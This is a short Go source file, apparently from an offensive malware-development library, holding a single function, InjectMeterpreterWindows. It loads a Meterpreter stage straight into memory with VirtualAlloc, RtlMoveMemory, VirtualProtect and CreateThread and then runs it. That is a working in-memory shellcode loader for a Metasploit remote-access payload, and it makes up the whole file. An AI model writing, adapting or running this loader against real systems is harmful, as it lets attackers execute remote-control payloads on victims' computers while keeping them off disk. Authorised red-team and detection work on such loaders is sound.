//go:build windows

package inject

import (
	"fmt"
	"unsafe"

	"github.com/oioio-space/maldev/win/api"
	"golang.org/x/sys/windows"
)

// InjectMeterpreterWindows executes a Meterpreter stage in memory using
// VirtualAlloc + RtlMoveMemory + CreateThread.
func InjectMeterpreterWindows(stage []byte) error {
	if len(stage) == 0 {
		return fmt.Errorf("empty stage")
	}

	addr, err := windows.VirtualAlloc(
		0,
		uintptr(len(stage)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return fmt.Errorf("VirtualAlloc: %w", err)
	}

	// Copy stage to allocated memory (RtlMoveMemory is void — no return check)
	api.ProcRtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&stage[0])), uintptr(len(stage)))

	// Transition to executable after write is complete
	var oldProtect uint32
	if err := windows.VirtualProtect(addr, uintptr(len(stage)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		return fmt.Errorf("VirtualProtect: %w", err)
	}

	// Create thread to execute
	var threadID uint32
	thread, _, err := api.ProcCreateThread.Call(
		0, 0, addr, 0, 0, uintptr(unsafe.Pointer(&threadID)),
	)
	if thread == 0 {
		return fmt.Errorf("CreateThread: %w", err)
	}

	return nil
}
